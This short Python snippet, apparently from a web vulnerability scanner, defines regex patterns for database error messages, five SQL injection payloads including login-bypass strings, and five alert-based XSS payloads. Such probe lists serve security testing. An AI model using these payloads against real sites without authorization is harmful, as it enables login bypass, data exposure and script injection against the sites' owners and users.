# Minimal SQL error patterns covering main DBs & error types
SQL_ERRORS = [
    "quoted string not properly terminated",
    "unclosed quotation mark after the character string",
    "you have an error in your sql syntax",
    "SQL syntax.*MySQL",
    "Warning.*mysql_.*",
    "PostgreSQL.*ERROR",
    "Warning.*pg_.*",
    "ORA-[0-9]{4}",  # Oracle error codes
    "Microsoft SQL Native Client error",
    "SQLite.Exception",
]

# Essential SQL injection payloads
sql_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' UNION SELECT NULL--",
    "admin' --",
    "1' ORDER BY 1--",
]

# Key diverse XSS payloads covering different injection methods
XSS_PAYLOADS = [
    "\"><svg/onload=alert(1)>",           # SVG onload event
    "<img src=x onerror=alert(1)>",       # Image onerror handler
    "<script>alert('XSS')</script>",       # Script tag alert
    "<body onload=alert('XSS')>",          # Body tag onload event
    "<input onfocus=alert('XSS') autofocus>",  # Input focus event
]
